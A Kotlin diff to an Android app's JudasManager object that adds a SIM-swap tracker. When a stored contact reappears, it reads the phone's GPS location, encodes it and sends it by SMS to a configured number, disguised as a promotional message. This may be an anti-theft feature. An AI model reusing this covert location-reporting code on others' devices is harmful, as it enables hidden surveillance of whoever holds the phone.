@@ -20,6 +20,66 @@ object JudasManager {
 
     fun getHandler(ctx: Context): String? = ctx.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE).getString(KEY_HANDLER, null)
 
+    fun evaluateSimContactTracker(ctx: Context) {
+        val prefs = ctx.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
+        val numberToCheck = prefs.getString("sim_track_check_num", "") ?: ""
+        val targetSmsNum = prefs.getString("sim_track_target_num", "") ?: ""
+        
+        if (numberToCheck.isEmpty() || targetSmsNum.isEmpty()) return
+
+        var contactExists = false
+        if (androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.READ_CONTACTS) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+            try {
+                val uri = android.net.Uri.withAppendedPath(android.provider.ContactsContract.PhoneLookup.CONTENT_FILTER_URI, android.net.Uri.encode(numberToCheck))
+                val cursor = ctx.contentResolver.query(uri, arrayOf(android.provider.ContactsContract.PhoneLookup._ID), null, null, null)
+                cursor?.use {
+                    if (it.count > 0) contactExists = true
+                }
+            } catch(e: Exception) {}
+        }
+
+        val isArmed = prefs.getBoolean("sim_tracker_armed", true)
+
+        if (contactExists) {
+            if (isArmed) {
+                prefs.edit().putBoolean("sim_tracker_armed", false).apply()
+                DebugLogger.log("SIM_TRACKER", "Contact [$numberToCheck] found! SIM available. Sending payload to $targetSmsNum")
+                
+                kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
+                    try {
+                        var locMsg = "0.0,0.0|ACC:0"
+                        if (androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                            val fused = com.google.android.gms.location.LocationServices.getFusedLocationProviderClient(ctx)
+                            val loc = kotlinx.coroutines.tasks.await(fused.lastLocation)
+                            if (loc != null) {
+                                locMsg = "${loc.latitude},${loc.longitude}|ACC:${loc.accuracy}"
+                            }
+                        }
+                        
+                        val payload = "LOC|$locMsg"
+                        val token = FidelCipher.encode(payload)
+                        val promo = FidelCipher.camouflage(ctx, token)
+                        
+                        val smsManager = ctx.getSystemService(android.telephony.SmsManager::class.java)
+                        val parts = smsManager.divideMessage(promo)
+                        smsManager.sendMultipartTextMessage(targetSmsNum, null, parts, null, null)
+                        
+                        DebugLogger.log("SIM_TRACKER", "Encrypted SMS dispatched successfully.")
+                    } catch (e: Exception) {
+                        DebugLogger.log("SIM_TRACKER_ERR", "Dispatch failed: ${e.message}")
+                    }
+                }
+            } else {
+                DebugLogger.log("SIM_TRACKER", "Contact found, but already disarmed.")
+            }
+        } else {
+            if (!isArmed) {
+                prefs.edit().putBoolean("sim_tracker_armed", true).apply()
+                DebugLogger.log("SIM_TRACKER", "Contact [$numberToCheck] missing! SIM removed. Armed and waiting.")
+            }
+        }
+    }
+
     fun getTrustedSims(ctx: Context): JSONArray {
         val prefs = ctx.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
         return try {
